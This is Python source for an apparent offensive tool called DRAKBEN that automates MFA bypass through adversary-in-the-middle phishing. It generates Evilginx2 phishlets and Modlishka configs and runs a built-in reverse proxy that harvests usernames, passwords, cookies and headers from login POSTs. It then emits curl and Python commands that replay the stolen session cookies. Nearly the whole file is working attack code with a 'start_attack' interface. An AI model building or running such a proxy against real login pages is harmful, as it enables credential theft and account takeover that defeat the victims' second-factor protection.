"""DRAKBEN Social Engineering - MFA Bypass (Multi-Tool)
Author: @drak_ben
Description: Man-in-the-Middle Proxy for 2FA/MFA bypass via session hijacking.
             Supports: Evilginx2, Modlishka, or built-in simple reverse proxy.
"""

import json
import logging
import os
import subprocess
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


class ProxyBackend(Enum):
    """Supported proxy backends."""

    EVILGINX2 = "evilginx2"
    MODLISHKA = "modlishka"
    BUILTIN = "builtin"  # Simple Python-based reverse proxy


@dataclass
class CapturedSession:
    """Represents a captured authentication session."""

    target_url: str
    username: str
    password: str
    session_tokens: dict[str, str]
    cookies: list[dict]
    timestamp: str


class MFABypass:
    """Evilginx2 integration for real-time MFA bypass.
    Captures session tokens after successful 2FA authentication.
    """

    def __init__(self, evilginx_path: str = "/opt/evilginx2") -> None:
        self.evilginx_path = evilginx_path
        self.phishlets_dir = os.path.join(evilginx_path, "phishlets")
        self.available = self._check_installation()
        self.process: subprocess.Popen[bytes] | None = None
        self.captured_sessions: list[CapturedSession] = []

        logger.info(
            f"MFA Bypass initialized (Evilginx2: {'Available' if self.available else 'Not Found'})",
        )

    def _check_installation(self) -> bool:
        """Check if Evilginx2 is installed."""
        binary_path = os.path.join(self.evilginx_path, "evilginx")
        return os.path.exists(binary_path)

    def list_phishlets(self) -> list[str]:
        """List available phishlets (login page templates)."""
        phishlets = []
        if os.path.exists(self.phishlets_dir):
            for f in os.listdir(self.phishlets_dir):
                if f.endswith(".yaml"):
                    phishlets.append(f.replace(".yaml", ""))
        return phishlets

    def create_phishlet(
        self,
        name: str,
        target_domain: str,
        login_path: str = "/login",
    ) -> str:
        """Generate a custom phishlet for a target."""
        phishlet_content = f"""
name: '{name}'
author: 'Drakben'
min_ver: '2.4.0'

proxy_hosts:
  - phish_subdomain: ''
    orig_subdomain: ''
    domain: '{target_domain}'
    session: true
    is_landing: true

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

auth_tokens:
  - domain: '.{target_domain}'
    keys: ['session', 'auth_token', 'access_token']

login:
  domain: '{target_domain}'
  path: '{login_path}'
"""
        phishlet_path = os.path.join(self.phishlets_dir, f"{name}.yaml")

        try:
            os.makedirs(self.phishlets_dir, exist_ok=True)
            with open(phishlet_path, "w", encoding="utf-8") as f:
                f.write(phishlet_content)
            logger.info("Phishlet created: %s", phishlet_path)
            return phishlet_path
        except Exception as e:
            logger.exception("Failed to create phishlet: %s", e)
            return ""

    def start_proxy(self, _phishlet: str, _lure_domain: str) -> bool:
        """Start Evilginx2 in background mode."""
        if not self.available:
            logger.error("Evilginx2 not installed. Cannot start proxy.")
            return False

        try:
            cmd = [
                os.path.join(self.evilginx_path, "evilginx"),
                "-p",
                self.phishlets_dir,
                "-developer",  # Developer mode for testing
            ]

            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=self.evilginx_path,
            )

            logger.info("Evilginx2 proxy started (PID: %s)", self.process.pid)
            return True

        except Exception as e:
            logger.exception("Failed to start Evilginx2: %s", e)
            return False

    def stop_proxy(self) -> None:
        """Stop Evilginx2 process."""
        if self.process:
            self.process.terminate()
            self.process = None
            logger.info("Evilginx2 proxy stopped")

    def parse_captured_sessions(
        self,
        log_file: str = "sessions.json",
    ) -> list[CapturedSession]:
        """Parse captured sessions from Evilginx2 output."""
        sessions = []
        log_path = os.path.join(self.evilginx_path, log_file)

        if os.path.exists(log_path):
            try:
                with open(log_path, encoding="utf-8") as f:
                    data = json.load(f)

                for entry in data.get("sessions", []):
                    session = CapturedSession(
                        target_url=entry.get("url", ""),
                        username=entry.get("username", ""),
                        password=entry.get("password", ""),
                        session_tokens=entry.get("tokens", {}),
                        cookies=entry.get("cookies", []),
                        timestamp=entry.get("time", ""),
                    )
                    sessions.append(session)

            except Exception as e:
                logger.exception("Failed to parse sessions: %s", e)

        self.captured_sessions = sessions
        return sessions

    def replay_session(self, session: CapturedSession) -> dict[str, str]:
        """Generate curl command or requests code to replay captured session."""
        cookies_str = "; ".join([f"{c['name']}={c['value']}" for c in session.cookies])

        replay_code = f"""
import requests

session = requests.Session()
session.cookies.update({{{", ".join([f'"{c["name"]}": "{c["value"]}"' for c in session.cookies])}}})

# You now have authenticated session
response = session.get("{session.target_url}")
print(response.status_code)
"""
        return {
            "curl": f'curl -b "{cookies_str}" {session.target_url}',
            "python": replay_code,
        }


# =============================================================================
# MODLISHKA INTEGRATION (Alternative to Evilginx2)
# =============================================================================


class ModlishkaProxy:
    """Modlishka integration for MFA bypass.

    Modlishka is a simpler alternative to Evilginx2 with easier setup.
    GitHub: https://github.com/drk1wi/Modlishka
    """

    def __init__(self, modlishka_path: str = "/opt/modlishka") -> None:
        self.modlishka_path = modlishka_path
        self.binary = os.path.join(modlishka_path, "Modlishka")
        self.available = os.path.exists(self.binary)
        self.process: subprocess.Popen[bytes] | None = None

        logger.info(
            f"Modlishka initialized ({'Available' if self.available else 'Not Found'})",
        )

    def create_config(
        self,
        target_domain: str,
        phishing_domain: str,
        listen_port: int = 443,
        cert_path: str = "",
        key_path: str = "",
    ) -> str:
        """Generate Modlishka configuration file.

        Args:
            target_domain: Real target domain (e.g., login.microsoft.com)
            phishing_domain: Phishing domain to use
            listen_port: Port to listen on
            cert_path: Path to SSL certificate
            key_path: Path to SSL private key

        Returns:
            Path to generated config file

        """
        config = {
            "proxyDomain": phishing_domain,
            "listeningAddress": f"0.0.0.0:{listen_port}",
            "target": target_domain,
            "trackingCookie": "id",
            "trackingParam": "id",
            "jsRules": "",
            "terminateTriggers": "",
            "terminateUrl": "",
            "jsReflectParam": "",
            "debug": True,
            "logPostOnly": False,
            "disableSecurity": False,
            "dynamicMode": False,
            "plugins": "autocert,all",
        }

        if cert_path and key_path:
            config["cert"] = cert_path
            config["key"] = key_path

        config_path = os.path.join(self.modlishka_path, f"{target_domain}.json")
        with open(config_path, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=2)

        logger.info(f"Modlishka config created: {config_path}")
        return config_path

    def start(self, config_path: str) -> bool:
        """Start Modlishka proxy."""
        if not self.available:
            logger.error("Modlishka not installed")
            return False

        try:
            cmd = [self.binary, "-config", config_path]
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            logger.info(f"Modlishka started (PID: {self.process.pid})")
            return True
        except Exception as e:
            logger.exception(f"Failed to start Modlishka: {e}")
            return False

    def stop(self) -> None:
        """Stop Modlishka proxy."""
        if self.process:
            self.process.terminate()
            self.process = None
            logger.info("Modlishka stopped")


# =============================================================================
# BUILT-IN SIMPLE REVERSE PROXY (No external dependencies)
# =============================================================================


@dataclass
class CapturedCredential:
    """Captured credential from proxy."""

    username: str
    password: str
    cookies: dict[str, str] = field(default_factory=dict)
    headers: dict[str, str] = field(default_factory=dict)
    timestamp: str = ""


class SimpleReverseProxy:
    """Built-in Python reverse proxy for MFA bypass.

    This is a lightweight alternative when Evilginx2/Modlishka are not available.
    Uses aiohttp for async HTTP proxying.
    """

    def __init__(self, listen_port: int = 8443) -> None:
        self.listen_port = listen_port
        self.target_url: str = ""
        self.captured_credentials: list[CapturedCredential] = []
        self.running = False
        self._server: Any = None

        logger.info(f"Simple Reverse Proxy initialized (port: {listen_port})")

    async def start(self, target_url: str) -> bool:
        """Start the reverse proxy.

        Args:
            target_url: Target URL to proxy (e.g., https://login.example.com)

        Returns:
            True if started successfully

        """
        try:
            from aiohttp import web
        except ImportError:
            logger.error("aiohttp required for SimpleReverseProxy")
            return False

        self.target_url = target_url.rstrip("/")

        async def proxy_handler(request: Any) -> Any:
            return await self._handle_request(request)

        app = web.Application()
        app.router.add_route("*", "/{path:.*}", proxy_handler)

        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", self.listen_port)
        await site.start()

        self.running = True
        self._server = runner
        logger.info(f"Reverse proxy started on port {self.listen_port} -> {target_url}")
        return True

    async def _handle_request(self, request: Any) -> Any:
        """Handle incoming proxy request."""
        import aiohttp
        from aiohttp import web

        path = request.match_info.get("path", "")
        target = f"{self.target_url}/{path}"
        if request.query_string:
            target += f"?{request.query_string}"

        # Read body for credential capture
        body = await request.read()

        # Capture POST credentials
        if request.method == "POST":
            self._capture_credentials(request, body)

        # Forward request
        headers = dict(request.headers)
        headers.pop("Host", None)

        try:
            async with aiohttp.ClientSession() as session:
                async with session.request(
                    request.method,
                    target,
                    headers=headers,
                    data=body,
                    ssl=False,  # NOSONAR — SSL verification intentionally disabled for pentesting MFA bypass proxy
                ) as response:
                    resp_body = await response.read()
                    resp_headers = dict(response.headers)

                    # Remove hop-by-hop headers
                    for h in ["Transfer-Encoding", "Content-Encoding", "Connection"]:
                        resp_headers.pop(h, None)

                    return web.Response(
                        body=resp_body,
                        status=response.status,
                        headers=resp_headers,
                    )
        except Exception as e:
            logger.error(f"Proxy error: {e}")
            return web.Response(text="Proxy Error", status=502)

    def _extract_form_credentials(self, data: dict) -> tuple[str, str]:
        """Extract username and password from form data.

        Args:
            data: Parsed form data dictionary

        Returns:
            Tuple of (username, password)
        """
        username = ""
        password = ""

        username_keys = ["username", "email", "user", "login"]
        password_keys = ["password", "pass", "pwd"]

        for key in username_keys:
            if key in data:
                username = data[key][0]
                break

        for key in password_keys:
            if key in data:
                password = data[key][0]
                break

        return username, password

    def _extract_json_credentials(self, data: dict) -> tuple[str, str]:
        """Extract username and password from JSON data.

        Args:
            data: Parsed JSON dictionary

        Returns:
            Tuple of (username, password)
        """
        username = data.get("username") or data.get("email") or ""
        password = data.get("password") or ""
        return username, password

    def _capture_credentials(self, request: Any, body: bytes) -> None:
        """Capture credentials from POST request.

        Args:
            request: HTTP request object
            body: Raw request body bytes
        """
        from datetime import datetime
        from urllib.parse import parse_qs

        try:
            content_type = request.headers.get("Content-Type", "")
            decoded_body = body.decode("utf-8", errors="ignore")

            username, password = "", ""

            if "application/x-www-form-urlencoded" in content_type:
                form_data = parse_qs(decoded_body)
                username, password = self._extract_form_credentials(form_data)

            elif "application/json" in content_type:
                json_data = json.loads(decoded_body)
                username, password = self._extract_json_credentials(json_data)

            if username or password:
                cred = CapturedCredential(
                    username=username,
                    password=password,
                    cookies=dict(request.cookies),
                    headers=dict(request.headers),
                    timestamp=datetime.now().isoformat(),
                )
                self.captured_credentials.append(cred)
                logger.warning("Captured credential: %s", username)

        except Exception as e:
            logger.debug("Credential capture error: %s", e)

    async def stop(self) -> None:
        """Stop the reverse proxy."""
        if self._server:
            await self._server.cleanup()
            self._server = None
        self.running = False
        logger.info("Reverse proxy stopped")

    def get_captured_credentials(self) -> list[CapturedCredential]:
        """Get list of captured credentials."""
        return self.captured_credentials


# =============================================================================
# UNIFIED MFA BYPASS INTERFACE
# =============================================================================


class UnifiedMFABypass:
    """Unified interface for MFA bypass using available backend.

    Automatically selects best available backend:
    1. Evilginx2 (if installed)
    2. Modlishka (if installed)
    3. Built-in SimpleReverseProxy (always available)
    """

    def __init__(self) -> None:
        self.evilginx = MFABypass()
        self.modlishka = ModlishkaProxy()
        self.builtin = SimpleReverseProxy()

        # Detect best available backend
        if self.evilginx.available:
            self.active_backend = ProxyBackend.EVILGINX2
        elif self.modlishka.available:
            self.active_backend = ProxyBackend.MODLISHKA
        else:
            self.active_backend = ProxyBackend.BUILTIN

        logger.info(f"UnifiedMFABypass using: {self.active_backend.value}")

    def get_available_backends(self) -> list[str]:
        """List available backends."""
        available = [ProxyBackend.BUILTIN.value]  # Always available
        if self.evilginx.available:
            available.append(ProxyBackend.EVILGINX2.value)
        if self.modlishka.available:
            available.append(ProxyBackend.MODLISHKA.value)
        return available

    def set_backend(self, backend: ProxyBackend) -> bool:
        """Switch to specific backend."""
        if backend == ProxyBackend.EVILGINX2 and not self.evilginx.available:
            logger.error("Evilginx2 not available")
            return False
        if backend == ProxyBackend.MODLISHKA and not self.modlishka.available:
            logger.error("Modlishka not available")
            return False

        self.active_backend = backend
        logger.info(f"Switched to backend: {backend.value}")
        return True

    async def start_attack(self, target_url: str, **kwargs: Any) -> bool:
        """Start MFA bypass attack using active backend."""
        if self.active_backend == ProxyBackend.BUILTIN:
            return await self.builtin.start(target_url)
        elif self.active_backend == ProxyBackend.MODLISHKA:
            config = self.modlishka.create_config(
                target_domain=target_url.replace("https://", "").replace("http://", ""),
                phishing_domain=kwargs.get("phishing_domain", "phish.local"),
            )
            return self.modlishka.start(config)
        else:
            # Evilginx requires more setup
            return self.evilginx.start_proxy(
                kwargs.get("phishlet", "default"),
                kwargs.get("lure_domain", "phish.local"),
            )

    async def stop_attack(self) -> None:
        """Stop active attack."""
        if self.active_backend == ProxyBackend.BUILTIN:
            await self.builtin.stop()
        elif self.active_backend == ProxyBackend.MODLISHKA:
            self.modlishka.stop()
        else:
            self.evilginx.stop_proxy()

    def get_captured(self) -> list[Any]:
        """Get captured credentials/sessions."""
        if self.active_backend == ProxyBackend.BUILTIN:
            return self.builtin.get_captured_credentials()
        elif self.active_backend == ProxyBackend.MODLISHKA:
            return self._parse_modlishka_logs()
        else:
            return self.evilginx.parse_captured_sessions()

    def _parse_modlishka_logs(self) -> list[CapturedCredential]:
        """Parse Modlishka captured credentials from log files.

        Modlishka stores captured data in JSON format in its data directory.
        Returns list of CapturedCredential objects.
        """
        from datetime import datetime

        credentials: list[CapturedCredential] = []
        log_path = os.path.join(self.modlishka.modlishka_path, "data", "captured.json")

        if not os.path.exists(log_path):
            logger.debug("Modlishka log file not found: %s", log_path)
            return credentials

        try:
            with open(log_path, encoding="utf-8") as f:
                data = json.load(f)

            for entry in data.get("credentials", []):
                cred = CapturedCredential(
                    username=entry.get("username", ""),
                    password=entry.get("password", ""),
                    cookies=entry.get("cookies", {}),
                    headers=entry.get("headers", {}),
                    timestamp=entry.get("timestamp", datetime.now().isoformat()),
                )
                credentials.append(cred)

            logger.info("Parsed %d credentials from Modlishka logs", len(credentials))

        except json.JSONDecodeError as e:
            logger.error("Invalid JSON in Modlishka log: %s", e)
        except Exception as e:
            logger.exception("Failed to parse Modlishka logs: %s", e)

        return credentials
